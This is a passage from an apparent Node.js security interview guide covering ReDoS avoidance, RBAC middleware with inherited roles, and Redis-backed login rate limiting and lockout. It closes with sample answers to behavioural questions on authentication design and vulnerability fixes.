// When the input almost-but-doesn't-quite match, the engine tries every combination
```

**How to avoid ReDoS:**

- Use Zod's built-in validators (`z.string().email()`) instead of custom regex — they're tested against ReDoS patterns
- If you must use regex, avoid nested quantifiers: `(a+)+`, `(a|b)*c`, `(a+){2,}`
- Use `re2` (Google's regex engine) which guarantees linear-time matching by disallowing backtracking
- Set timeouts on validation: if a validation takes more than 100ms, reject the input

```typescript
// SAFE — Zod's built-in email validator
const schema = z.object({
  email: z.string().email(), // no custom regex needed
});

// SAFE — if custom regex is needed, use linear-time patterns
const safeEmailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // no nested quantifiers
```

</details>

## Practical — Access Control & Production

<details>
<summary>22. Implement RBAC middleware for a Node.js API — show the role and permission model (user → roles → permissions), the middleware that checks permissions on each route, how to handle hierarchical roles (admin inherits editor permissions), and what the common mistakes are (checking roles instead of permissions, hardcoding role names)</summary>

Building on the RBAC concepts from question 13, here's the full implementation.

**Role and permission definitions (configuration, not code):**

```typescript
// permissions.ts — the permission registry
// Permissions are granular, resource:action pairs
const PERMISSIONS = {
  'articles:read': 'View articles',
  'articles:write': 'Create and edit articles',
  'articles:delete': 'Delete own articles',
  'articles:delete-any': 'Delete any article (admin override)',
  'articles:publish': 'Publish articles',
  'users:read': 'View user profiles',
  'users:write': 'Edit user profiles',
  'users:delete': 'Delete users',
  'settings:manage': 'Manage system settings',
} as const;

type Permission = keyof typeof PERMISSIONS;

// roles.ts — role-to-permission mapping with hierarchy
interface RoleDefinition {
  permissions: Permission[];
  inherits?: string[]; // roles this role inherits from
}

const ROLES: Record<string, RoleDefinition> = {
  viewer: {
    permissions: ['articles:read', 'users:read'],
  },
  editor: {
    permissions: ['articles:write', 'articles:publish'],
    inherits: ['viewer'], // editor gets all viewer permissions too
  },
  admin: {
    permissions: ['articles:delete', 'articles:delete-any', 'users:write', 'users:delete', 'settings:manage'],
    inherits: ['editor'], // admin gets all editor (and transitively, viewer) permissions
  },
};
```

**Resolving permissions with inheritance:**

```typescript
function resolvePermissions(roleName: string, visited = new Set<string>()): Set<Permission> {
  if (visited.has(roleName)) return new Set(); // prevent circular inheritance
  visited.add(roleName);

  const role = ROLES[roleName];
  if (!role) return new Set();

  const permissions = new Set<Permission>(role.permissions);

  // Recursively collect inherited permissions
  for (const parentRole of role.inherits ?? []) {
    for (const perm of resolvePermissions(parentRole, visited)) {
      permissions.add(perm);
    }
  }

  return permissions;
}

// Cache resolved permissions at startup — roles don't change at runtime
const RESOLVED_PERMISSIONS = new Map<string, Set<Permission>>();
for (const roleName of Object.keys(ROLES)) {
  RESOLVED_PERMISSIONS.set(roleName, resolvePermissions(roleName));
}

// Get all permissions for a user's roles
function getUserPermissions(userRoles: string[]): Set<Permission> {
  const permissions = new Set<Permission>();
  for (const role of userRoles) {
    const rolePerms = RESOLVED_PERMISSIONS.get(role);
    if (rolePerms) {
      for (const perm of rolePerms) permissions.add(perm);
    }
  }
  return permissions;
}
```

**Authorization middleware — checks permissions, not roles:**

```typescript
function requirePermissions(...required: Permission[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    // req.user is set by authentication middleware (question 1)
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const userPermissions = getUserPermissions(req.user.roles);
    const missing = required.filter(p => !userPermissions.has(p));

    if (missing.length > 0) {
      return res.status(403).json({
        error: 'Forbidden',
        missing, // helpful for debugging, remove in production if sensitive
      });
    }

    next();
  };
}

// Route registration — permissions are explicit and readable
app.get('/articles',      authenticate, requirePermissions('articles:read'),    listArticles);
app.post('/articles',     authenticate, requirePermissions('articles:write'),   createArticle);
app.delete('/articles/:id', authenticate, requirePermissions('articles:delete'), deleteArticle);
app.put('/settings',      authenticate, requirePermissions('settings:manage'),  updateSettings);
```

**Common mistakes:**

1. **Checking roles instead of permissions:**
```typescript
// BAD — hardcodes role knowledge into business logic
if (user.roles.includes('admin')) { allowDelete(); }
// Adding a "super-editor" role that can also delete requires code changes

// GOOD — checks capability, not identity
if (userPermissions.has('articles:delete')) { allowDelete(); }
// Any role granted this permission works without code changes
```

2. **Hardcoding role names in route handlers:**
```typescript
// BAD — role names scattered across the codebase
app.delete('/users/:id', authenticate, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).send('Forbidden');
  // ...
});

// GOOD — centralized middleware, declarative permissions
app.delete('/users/:id', authenticate, requirePermissions('users:delete'), deleteUser);
```

3. **Not handling multiple roles:** Users often have multiple roles (e.g., "editor" in one project, "viewer" in another). The permission resolution must aggregate across all roles.

4. **Forgetting resource-level checks:** RBAC tells you "this user can delete articles." It doesn't tell you "this user can delete THIS article." Ownership checks (ABAC territory, as covered in question 13) must happen in the route handler. Note: the route middleware already checked `articles:delete` (the basic permission), so the handler only needs to check ownership and a separate admin-level override permission:

```typescript
// Route: app.delete('/articles/:id', authenticate, requirePermissions('articles:delete'), deleteArticle);
// 'articles:delete' was already checked by middleware — the handler adds ownership logic

async function deleteArticle(req: Request, res: Response) {
  const article = await db.articles.findById(req.params.id);
  const userPerms = getUserPermissions(req.user.roles);
  // Owner can delete their own; 'articles:delete-any' overrides ownership (admin-level)
  if (article.authorId !== req.user.id && !userPerms.has('articles:delete-any')) {
    return res.status(403).json({ error: 'Not your article' });
  }
  await db.articles.delete(req.params.id);
  res.status(204).send();
}
```

</details>

<details>
<summary>23. Implement rate limiting and brute-force protection for a login endpoint — show the middleware that limits login attempts per IP and per account (using Redis for distributed state), implement progressive delays or temporary lockouts after repeated failures, configure request payload size limits to prevent oversized-body DoS attacks, and explain how attackers bypass naive rate limiting (distributed attacks, credential stuffing)</summary>

Building on the rate limiting strategy from question 14, here's the implementation.

**Redis-based dual rate limiter (per-IP and per-account):**

```typescript
import { createClient } from 'redis';

const redis = createClient({ url: process.env.REDIS_URL });
await redis.connect();

interface RateLimitResult {
  allowed: boolean;
  retryAfter?: number;    // seconds until the limit resets
  remainingAttempts: number;
}

async function checkRateLimit(
  key: string,
  maxAttempts: number,
  windowSeconds: number
): Promise<RateLimitResult> {
  const current = await redis.incr(key);

  // Set expiry only on first increment (creates the sliding window)
  if (current === 1) {
    await redis.expire(key, windowSeconds);
  }

  if (current > maxAttempts) {
    const ttl = await redis.ttl(key);
    return { allowed: false, retryAfter: ttl, remainingAttempts: 0 };
  }

  return { allowed: true, remainingAttempts: maxAttempts - current };
}
```

**Login endpoint with combined rate limiting and progressive lockout:**

```typescript
const IP_LIMIT = 20;           // max attempts per IP per window
const IP_WINDOW = 15 * 60;     // 15 minutes
const ACCOUNT_LIMIT = 5;       // max failures per account per window
const ACCOUNT_WINDOW = 15 * 60;
const LOCKOUT_THRESHOLD = 10;  // lock account after this many failures
const LOCKOUT_DURATION = 30 * 60; // 30-minute lockout

app.post('/login', async (req, res) => {
  const ip = req.ip;
  const { email, password } = req.body;

  // Layer 1: Per-IP rate limit
  const ipResult = await checkRateLimit(`rl:ip:${ip}`, IP_LIMIT, IP_WINDOW);
  if (!ipResult.allowed) {
    res.set('Retry-After', String(ipResult.retryAfter));
    return res.status(429).json({ error: 'Too many requests. Try again later.' });
  }

  // Layer 2: Check account lockout (before doing any DB work)
  const lockoutKey = `lockout:${email}`;
  const isLockedOut = await redis.exists(lockoutKey);
  if (isLockedOut) {
    const ttl = await redis.ttl(lockoutKey);
    return res.status(423).json({
      error: 'Account temporarily locked due to repeated failures.',
      retryAfter: ttl,
    });
  }

  // Layer 3: Per-account rate limit
  const accountKey = `rl:account:${email}`;
  const accountResult = await checkRateLimit(accountKey, ACCOUNT_LIMIT, ACCOUNT_WINDOW);
  if (!accountResult.allowed) {
    res.set('Retry-After', String(accountResult.retryAfter));
    return res.status(429).json({ error: 'Too many login attempts for this account.' });
  }

  // Authenticate
  const user = await db.users.findByEmail(email);
  // Use same response for invalid email and wrong password — prevents enumeration
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    // Track cumulative failures for lockout
    const failKey = `failures:${email}`;
    const failures = await redis.incr(failKey);
    await redis.expire(failKey, LOCKOUT_DURATION);

    if (failures >= LOCKOUT_THRESHOLD) {
      await redis.setEx(lockoutKey, LOCKOUT_DURATION, '1');
      // Notify the account holder via email
      await sendLockoutNotification(email);
      return res.status(423).json({ error: 'Account locked due to repeated failures.' });
    }

    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Success — clear failure counters
  await redis.del(`failures:${email}`, accountKey);

  const tokens = await issueTokenPair(user.id);
  res.json(tokens);
});
```

**Request payload size limits:**

An attacker can send a 10GB JSON body to exhaust server memory and CPU (parsing huge JSON is expensive). Limit payload size at the framework level:

```typescript
import express from 'express';

const app = express();

// Global limit — 100KB is generous for most APIs
app.use(express.json({ limit: '100kb' }));

// Tighter limit specifically for auth endpoints
app.use('/login', express.json({ limit: '1kb' })); // email + password fits in 1KB

// At the reverse proxy level (nginx) — defense in depth
// nginx.conf:
//   client_max_body_size 1m;   # reject bodies > 1MB before they reach Node.js
```

Setting this at the reverse proxy (nginx/envoy) is important because it rejects oversized bodies before they consume Node.js memory. The Express limit is a second layer.

**How attackers bypass naive rate limiting:**

1. **Distributed attacks (botnet):** Thousands of IPs, each making a few requests — stays under per-IP limits. **Mitigation:** Per-account limits catch this since the target account sees all attempts regardless of source IP. Global anomaly detection (sudden spike in failed logins across all accounts) provides an additional signal.

2. **Credential stuffing:** Not brute-forcing one account — testing millions of leaked email/password pairs, one attempt each. Per-account limits don't trigger because each account sees only 1-2 attempts. **Mitigation:** Per-IP limits help (the attacker's IP pool is finite), combined with device fingerprinting, CAPTCHA after N global failures, and monitoring for anomalous login patterns (thousands of different accounts from the same IP range).

3. **Slow attacks:** One attempt per minute per IP — stays under all rate limits. **Mitigation:** This is inherently slow enough to be ineffective against strong passwords. Ensure password policies require sufficient complexity, and use bcrypt/argon2 with high cost factors (covered in question 11) so each attempt is expensive.

4. **IP rotation via proxies/VPNs:** Attacker rotates through residential proxies. **Mitigation:** Per-account limits are IP-independent. Consider reputation-based blocking (known proxy/VPN IP ranges), and require CAPTCHA for accounts that have received failed attempts from multiple IPs in a short window.

</details>

---

## Experience-Based Questions

These questions test real-world experience. Prepare by mapping them to your own projects and situations.

<details>
<summary>24. Tell me about a time you designed or significantly improved an authentication system — what approach did you choose (JWT, sessions, OAuth), what tradeoffs did you face, and what would you do differently?</summary>

**What the interviewer is looking for:**

- Ability to evaluate authentication approaches based on real system constraints (not just textbook knowledge)
- Understanding of tradeoffs — security vs complexity, stateless vs stateful, build vs buy
- Technical depth on the chosen approach (JWT mechanics, session management, OAuth flows)
- Reflection and growth — what you learned, what you'd change

**Suggested structure (STAR-T: Situation, Task, Action, Result, Takeaway):**

1. **Situation**: What was the system? What authentication existed (or didn't)? What was the scale (users, services, multi-tenant)?
2. **Task**: What needed to change and why? (New feature, security audit finding, scaling problem, migration)
3. **Action**: What approach did you choose and why? Walk through the key design decisions:
   - Why JWT/sessions/OAuth for this use case
   - Key management and rotation strategy
   - How you handled revocation
   - Migration strategy if replacing an existing system
4. **Result**: Measurable outcomes — reduced auth-related incidents, simplified onboarding for new services, login latency numbers
5. **Takeaway**: What would you do differently? What did you learn about auth system design?

**Example outline to personalize:**

> "We had a monolithic Node.js application using session-based auth with an in-memory store. As we split into microservices, each service needed to verify user identity independently. We migrated to JWT with RS256 — the auth service signs tokens with a private key, and downstream services verify with the public key via JWKS.
>
> The main tradeoff was revocation. We initially relied on short-lived tokens (15min) but quickly needed a blocklist for immediate logout on password reset. We added a Redis-based blocklist checked on each request — which reintroduced some centralized state but was scoped to security-critical events, not every session.
>
> In retrospect, I'd evaluate a BFF (Backend for Frontend) pattern more seriously for our web clients — storing tokens in HttpOnly cookies rather than localStorage would have eliminated an entire class of XSS risks."

**Key points to hit:**
- Show you understand the tradeoffs of the approach you chose (not just the benefits)
- Mention a specific technical challenge you solved (key rotation, migration, revocation)
- Be honest about mistakes or things you'd change — this shows growth
- Tie decisions to concrete system requirements, not abstract preferences

</details>

<details>
<summary>25. Describe a security vulnerability you discovered or fixed in a production application — how did you find it, what was the impact, and what changes did you make to prevent similar issues?</summary>

**What the interviewer is looking for:**

- Security awareness — do you actively think about attack vectors in your daily work?
- Incident handling maturity — how you assessed severity, communicated, and responded
- Systemic thinking — did you just patch the bug, or did you prevent the entire class of vulnerability?
- Knowledge of common vulnerability types (OWASP Top 10 from question 3)

**Suggested structure:**

1. **Discovery**: How did you find it? Code review, security audit, automated scanning, customer report, monitoring anomaly, or you noticed it while working on something else?
2. **Vulnerability**: What was it technically? (IDOR, SQL injection, missing auth check, SSRF, exposed secrets, insecure direct object reference) Explain it clearly — show you understand the attack vector.
3. **Impact assessment**: What could an attacker have done? Data exposure scope, affected users, financial risk. Show you can triage severity.
4. **Immediate fix**: What did you do right away? (Patch, hotfix, disable the feature, rotate credentials)
5. **Systemic prevention**: What did you change so this class of vulnerability can't recur? (Added middleware, automated scanning, schema validation, security review process)

**Example outline to personalize:**

> "During a code review, I noticed an API endpoint that fetched user documents by ID without checking ownership — a classic IDOR vulnerability. Any authenticated user could access any other user's documents by iterating through IDs.
>
> I assessed the impact: the endpoint had been live for 3 months, and access logs showed no evidence of exploitation, but all user documents (including PII) were theoretically accessible to any authenticated user.
>
> Immediate fix: Added an ownership check to the endpoint within hours. Broader fix: I audited all endpoints returning user-scoped resources and found two more missing ownership checks. I then added a shared middleware pattern that automatically scopes queries to the authenticated user's data, making it harder to forget ownership checks on new endpoints. I also added integration tests that specifically test cross-user access patterns."

**Key points to hit:**
- Name the specific vulnerability type (shows security vocabulary)
- Quantify the potential impact (shows you can assess risk)
- Show both the immediate fix AND the systemic improvement
- If you introduced a process change (security review checklist, automated scanning), mention it
- Don't exaggerate — interviewers can tell. A small but real finding with thoughtful systemic response is more impressive than a dramatized story.

</details>

<details>
<summary>26. Describe a time you had to balance security requirements with developer experience or business needs — what was the tradeoff, how did you make the decision, and what was the outcome?</summary>

**What the interviewer is looking for:**

- Pragmatism — security is not absolute; it exists in tension with usability, speed, and cost
- Communication skills — how you presented tradeoffs to non-security stakeholders
- Decision-making framework — how you evaluated risk vs impact
- Senior-level judgment — knowing when "good enough" security is acceptable and when it's not

**Suggested structure:**

1. **The tension**: What was the security requirement? What business need or DX concern was it conflicting with? (Launch deadline, API usability, onboarding friction, development speed)
2. **The options**: What were the realistic choices? Frame them as a spectrum (maximum security vs maximum convenience), with at least one middle-ground option.
3. **How you decided**: What criteria did you use? Risk assessment (likelihood x impact), reversibility, compliance requirements, user impact
4. **The outcome**: What happened? Did the decision hold up? Any follow-up changes?

**Example outline to personalize:**

> "We needed to add API authentication for third-party integrations. The security team recommended OAuth 2.0 with short-lived tokens and refresh token rotation. The developer experience concern: our partners were small teams without OAuth expertise, and the integration complexity would slow adoption of our API.
>
> I proposed a phased approach: launch with API keys (simpler for partners to implement) with mandatory key rotation every 90 days and strict rate limiting, then migrate to OAuth for partners needing user-level delegation. I presented the risk assessment: API keys with hashed storage, rotation, and monitoring covered 90% of the threat model. The remaining 10% (user delegation, granular scoping) was only relevant for a subset of use cases.
>
> The outcome: 15 partners integrated in the first month (vs the projected 3-4 with OAuth-only). We added OAuth support in Q2 for partners that needed it. The API keys haven't had a security incident, partly because we built good monitoring (anomalous usage patterns, failed auth spikes)."

**Key points to hit:**
- Show you understand both sides — don't dismiss security concerns or business needs
- Present options as a spectrum, not binary — "we can do A or B" is junior; "here are three options with different risk/cost profiles" is senior
- Quantify where possible — "this adds 2 weeks to the timeline" or "this affects 90% of our users"
- Show the security measures you kept even in the "lighter" option — demonstrate you didn't just capitulate on security, you found a responsible middle ground
- If the decision had negative consequences, own them — "in retrospect, we should have..." shows maturity

</details>
